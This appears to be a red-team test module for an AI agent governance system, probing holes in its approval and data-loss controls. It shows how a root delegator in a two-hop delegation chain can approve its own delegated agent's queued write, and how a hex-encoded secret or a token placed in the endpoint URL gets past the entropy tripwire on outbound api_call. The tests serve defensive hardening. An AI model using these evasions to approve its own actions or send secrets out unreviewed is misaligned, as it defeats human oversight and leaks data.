"""Wave-27 red-team probes, round 2 (2026-09-22).

Coordination: the closure lanes own their fixes; this module is the
RED-TEAM attack lane. Round 2:

* F101 chain-delegation ratchet (-> F103): the F101 closure guard
  excludes the IMMEDIATE delegator from decide()/cast_vote(), but with
  delegation.max_depth >= 2 a grant carries an ANCESTOR chain (the grant
  record's ``chain`` field) and the approval record stamps only the
  immediate delegator -- so the ANCESTOR (root) delegator is never
  excluded. Round-2 attack verified 2026-09-22: coder-1 -> worker-1 (G1) ->
  worker-2 (G2 sub-grant); worker-2's grant-verified write_file queues
  under worker-2 with delegation_delegator=worker-1; coder-1 decides TRUE
  by agent_id AND by principal alias (both ALLOWED, action executes) and
  casts a quorum vote (ALLOWED). Filed as F103 (MEDIUM, OPEN).
  Conditional on max_depth >= 2 (default policy ships max_depth=1, but
  policy lint explicitly allows 1..3 and the F101 closure evidence never
  tested depth > 1).

* F99 closure ratchet (-> F105, F106): the F99 closure queues api_call
  when a string param VALUE carries a token-like run >= 20 chars with
  Shannon entropy > 4.3. Round-2 attacks verified 2026-09-22: (a) a
  hex-encoded 32-byte secret (entropy 3.217 -- the hex alphabet caps
  entropy at 4.0 < 4.3, always evades; the F2/F8 encoding-aware decode
  only helps KNOWN formats) executes with no approval -- F105;
  (b) the same high-entropy token in the endpoint URL query string or
  path executes -- the high_entropy_payload signal scans params ONLY
  and the F94 allowlist matches hostname only -- F106. Documented
  residuals re-verified real: <20-char chunking, low-entropy padding
  concatenated to the token (run entropy 2.828), thin-margin tokens.

All runs synthetic/local, $0. Deterministic: no randomness, no
wall-clock dependence, no network beyond loopback.
"""

import contextlib
import os
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))
sys.path.insert(0, str(REPO_ROOT / "tests"))
sys.path.insert(0, str(REPO_ROOT / "evals"))
import probe_lines  # noqa: E402  (canonical probe-line form)

import harness  # noqa: E402
from gov import log as log_mod  # noqa: E402
from gov.policy import PolicyEngine  # noqa: E402
from test_delegation_primitive import (  # noqa: E402
    _policy_with, _delegation_block)

RESULTS = []
SITUATIONS = {}


@contextlib.contextmanager
def _env(**kw):
    saved = {k: os.environ.get(k) for k in kw}
    try:
        for k, v in kw.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
        yield
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


@contextlib.contextmanager
def _dev_keys(enabled=True):
    """Wave-81: explicit test-key provisioning.

    Replaces the deleted gov.log dev-key opt-in. With enabled=True,
    yields with an explicit random GOV_LOG_KEY/GOV_LOG_KEY_EPOCH set
    and GOV_LOG_KEY_ARCHIVE cleared, restoring everything afterwards.
    enabled=False is a plain passthrough (no key provisioned).
    """
    if not enabled:
        yield
        return
    import secrets as _secrets
    _saved = {n: os.environ.get(n) for n in (
        "GOV_LOG_KEY", "GOV_LOG_KEY_EPOCH", "GOV_LOG_KEY_ARCHIVE")}
    _had = {n: n in os.environ for n in _saved}
    os.environ["GOV_LOG_KEY"] = _secrets.token_hex(32)
    os.environ["GOV_LOG_KEY_EPOCH"] = "test"
    os.environ.pop("GOV_LOG_KEY_ARCHIVE", None)
    try:
        yield
    finally:
        for _n in _saved:
            if _had[_n]:
                os.environ[_n] = _saved[_n]
            else:
                os.environ.pop(_n, None)
@contextlib.contextmanager
def _govrun():
    """One isolated governance run with dev keys on, restored after."""
    with _dev_keys(True):
        yield


def _sit(sid):
    def deco(fn):
        def wrapper():
            try:
                detail = fn()
                if not isinstance(detail, dict):
                    detail = {"note": str(detail)}
                verdict = detail.pop("verdict", "stopped")
                RESULTS.append({"id": sid, "verdict": verdict,
                                "detail": detail})
            except Exception as e:  # noqa: BLE001 - probe must not die
                RESULTS.append({"id": sid, "verdict": "error",
                                "detail": {"error": "%s: %s"
                                           % (type(e).__name__, e)}})
        wrapper.__name__ = fn.__name__
        wrapper.__doc__ = fn.__doc__
        SITUATIONS[sid] = wrapper
        return wrapper
    return deco


def _chain_run():
    """Fresh run with max_depth=2 and unscoped framing denied; returns
    (ctx, executor, approvals, g1, g2, root, mid, leaf)."""
    policy = PolicyEngine(_policy_with(_delegation_block(
        enabled=True, max_depth=2, unscoped_delegation="deny")))
    ctx = harness.make_run(policy_path=policy.yaml_path)
    ex = ctx["executor"]
    root = ctx["mint_identity"]("coder-1", "coder", "research-org")
    mid = ctx["mint_identity"]("worker-1", "coder", "contractor-corp")
    leaf = ctx["mint_identity"]("worker-2", "coder", "contractor-corp")
    store = ex._delegation_store
    g1 = store.delegate_grant(root, "worker-1", {"tools": ["write_file"]})
    g2 = store.delegate_grant(mid, "worker-2", {"tools": ["write_file"]},
                              parent_grant_id=g1["grant_id"])
    return ctx, ex, ctx["approvals"], g1, g2, root, mid, leaf


def _try_decide(approvals, aid, decided_by):
    try:
        approvals.decide(aid, True, reason="looks fine",
                         decided_by=decided_by)
        return True
    except ValueError:
        return False


@_sit("redteam.p10.w27_chain_ancestor_decide")
def sit_p10_chain_ancestor_decide():
    """F103 (MEDIUM, OPEN): with delegation.max_depth >= 2, the F101
    guard's delegator exclusion is single-hop. A depth-2 chain
    (coder-1 -> worker-1 -> worker-2) queues the leaf's grant-verified
    call with delegation_delegator=worker-1 only; the ANCESTOR
    delegator coder-1 can decide() by agent_id and by principal alias
    (both execute the action) and can cast_vote() on the quorum path.
    The F101 guard holds at depth 1 (immediate delegator and requester
    still refused) -- the hole is exactly the ancestor hop."""
    with _govrun():
        ctx, ex, approvals, g1, g2, root, mid, leaf = _chain_run()
        n = [0]

        def queue_one():
            n[0] += 1
            r = ex.call(leaf, "write_file",
                        path="/tmp/w27rt2-chain-%d.txt" % n[0],
                        content="x",
                        delegation_grant_id=g2["grant_id"])
            assert r["status"] == "queued", r
            return r["approval_id"]

        # Sanity: the chain is real (G2's store record has coder-1 as
        # ancestor; the approval record stamps only the immediate
        # delegator).
        chain_delegators = [h.get("delegator")
                            for h in (g2.get("chain") or [])]
        aid = queue_one()
        rec = approvals.get(aid)
        stamped = (rec.get("delegation_grant_id") == g2["grant_id"]
                   and (rec.get("delegation_delegator") or {})
                   .get("agent_id") == "worker-1")
        # Controls: F101's guard must still hold at depth 1.
        immediate_refused = not _try_decide(approvals, aid, "worker-1")
        requester_refused = not _try_decide(approvals, aid, "worker-2")
        # Attack 1: ancestor decides by agent_id.
        aid_a = queue_one()
        ancestor_agent_allowed = _try_decide(approvals, aid_a, "coder-1")
        executed = (approvals.get(aid_a)["status"] == "approved")
        if executed:
            ex.execute_approved()
        # Attack 2: ancestor decides by principal alias.
        aid_b = queue_one()
        ancestor_principal_allowed = _try_decide(
            approvals, aid_b, "research-org")
        # Attack 3: ancestor votes on the quorum path.
        approvals.set_quorum_config(
            {"min_approvals": 2,
             "eligible_principals": ["research-org", "alice", "bob"]})
        aid_c = queue_one()
        try:
            approvals.cast_vote(aid_c, True, "fine", root)
            ancestor_vote_allowed = True
        except ValueError:
            ancestor_vote_allowed = False
        breaks = [b for b, name in (
            (ancestor_agent_allowed, "decide-agent_id"),
            (ancestor_principal_allowed, "decide-principal"),
            (ancestor_vote_allowed, "cast_vote")) if b]
    sane = (chain_delegators == ["coder-1"] and stamped
            and immediate_refused and requester_refused)
    return {"verdict": ("break" if (breaks and sane)
                        else "stopped" if sane else "error"),
            "note": ("chain_ancestors=%s stamped_immediate_only=%s "
                     "controls(immediate,requester)_refused=%s "
                     "ancestor_breaks=%s executed_after_ancestor_decide=%s"
                     % (chain_delegators, stamped,
                        (immediate_refused and requester_refused),
                        breaks, executed))}




# --------------------------------------------------------------------------
# F99 closure ratchet -> F105, F106 (2026-09-22, round 2)
# --------------------------------------------------------------------------

_F99_ENDPOINT = "https://synthetic.local/collect"
# Deterministic high-entropy token (pure-alphanumeric: one regex run).
_F99_HIGH_TOKEN = "K7mQ9vX2pL4nB8wZ3tR6yU1iO5aS0dFeGhJ9kL2"
# Deterministic "secret": 32 bytes -> 64 hex chars (entropy <= 4.0).
_F99_SECRET_HEX = bytes(range(32)).hex()


def _f99_call(params, endpoint=_F99_ENDPOINT, tag="rt"):
    ctx = harness.make_run()
    ident = ctx["mint_identity"]("f99-" + tag, "researcher", "org")
    return ctx["executor"].call(ident, "api_call", endpoint=endpoint,
                               params=params)


@_sit("redteam.egress.w27_api_call_hex_encoded_secret")
def sit_egress_api_call_hex_encoded_secret():
    """F105 (MEDIUM, OPEN): the F99 closure's 4.3 entropy tripwire is
    alphabet-blind. A hex-encoded 32-byte secret (64 hex chars,
    entropy ~3.2 -- the hex alphabet caps entropy at 4.0 < 4.3) in
    api_call params EXECUTES with no approval; the F2/F8
    encoding-aware decode only re-runs KNOWN credential patterns, and
    the tripwire runs on the original text. Control: the same bytes
    as a high-entropy alphanumeric token queue under
    approval-api-high-entropy (else the probe is stale)."""
    with _govrun():
        from gov import dlp as dlp_mod
        assert dlp_mod._shannon_entropy(_F99_HIGH_TOKEN) > 4.3
        assert dlp_mod._shannon_entropy(_F99_SECRET_HEX) < 4.3
        control = _f99_call({"checksum": _F99_HIGH_TOKEN}, tag="hex-c")
        control_ok = (control["status"] == "queued"
                      and control.get("policy_id")
                      == "approval-api-high-entropy")
        attack = _f99_call({"exfil": _F99_SECRET_HEX}, tag="hex-a")
        broke = (attack["status"] == "executed")
    return {"verdict": ("break" if (broke and control_ok)
                        else "stopped" if control_ok else "error"),
            "note": ("hex_secret_entropy=%.3f control_queued=%s "
                     "hex_exfil_status=%s"
                     % (dlp_mod._shannon_entropy(_F99_SECRET_HEX),
                        control_ok, attack["status"]))}


@_sit("redteam.egress.w27_api_call_endpoint_url_token")
def sit_egress_api_call_endpoint_url_token():
    """F106 (MEDIUM, OPEN): the F99 high_entropy_payload signal scans
    api_call PARAMS only. The same high-entropy token that queues from
    params EXECUTES when placed in the endpoint URL query string or
    path -- the F94 allowlist matches hostname only. Control: the
    token in params queues under approval-api-high-entropy (else the
    probe is stale)."""
    with _govrun():
        control = _f99_call({"checksum": _F99_HIGH_TOKEN}, tag="url-c")
        control_ok = (control["status"] == "queued"
                      and control.get("policy_id")
                      == "approval-api-high-entropy")
        q = _f99_call({"result": "ok"},
                      endpoint=_F99_ENDPOINT + "?exfil=" + _F99_HIGH_TOKEN,
                      tag="url-q")
        p = _f99_call({"result": "ok"},
                      endpoint=_F99_ENDPOINT + "/x/" + _F99_HIGH_TOKEN,
                      tag="url-p")
        broke = (q["status"] == "executed"
                 and p["status"] == "executed")
    return {"verdict": ("break" if (broke and control_ok)
                        else "stopped" if control_ok else "error"),
            "note": ("control_queued=%s query_status=%s path_status=%s"
                     % (control_ok, q["status"], p["status"]))}


# D1 verdict mapping for the HOLD/MISS vocabulary
# (evals/SUMMARY_FORM_POLICIES.md): "stopped" (attack stopped) -> HELD,
# "break" -> BREAK, "error" -> ERROR, "residual" -> HELD with a
# "residual: " note prefix. Red-first: an unmapped verdict maps to BREAK.
_VERDICT_MAP = {"stopped": "HELD", "break": "BREAK", "error": "ERROR",
                "residual": "HELD"}


def _note_of(row):
    # D2 contract for the w72 family: the note lives under
    # detail["note"], falling back to detail["error"] for harness
    # exceptions (which record {"error": ...} with no "note").
    return row["detail"].get("note") or row["detail"].get("error", "")


def main():
    for sid in sorted(SITUATIONS):
        SITUATIONS[sid]()
    rows = [{"id": r["id"],
             "verdict": _VERDICT_MAP.get(r["verdict"], "BREAK"),
             "detail": r["detail"]} for r in RESULTS]
    probe_lines.emit_dicts(rows, pid_key="id", note_getter=_note_of)
    brk = sum(1 for r in rows if r["verdict"] == "BREAK")
    held = sum(1 for r in rows if r["verdict"] == "HELD")
    err = sum(1 for r in rows if r["verdict"] == "ERROR")
    print("w27rt2 battery: %d BREAK / %d HELD / %d ERROR"
          % (brk, held, err))
    _coh_ok, _coh_diags = probe_lines.check_coherence(
        [(r["id"], r["verdict"], _note_of(r)) for r in rows], brk, held, err)
    if not _coh_ok:
        print("coherence-WARNING: %s" % "; ".join(_coh_diags))
    # The old standalone block had no exit contract (always exit 0);
    # preserve it exactly.
    return 0


if __name__ == "__main__":
    sys.exit(main())
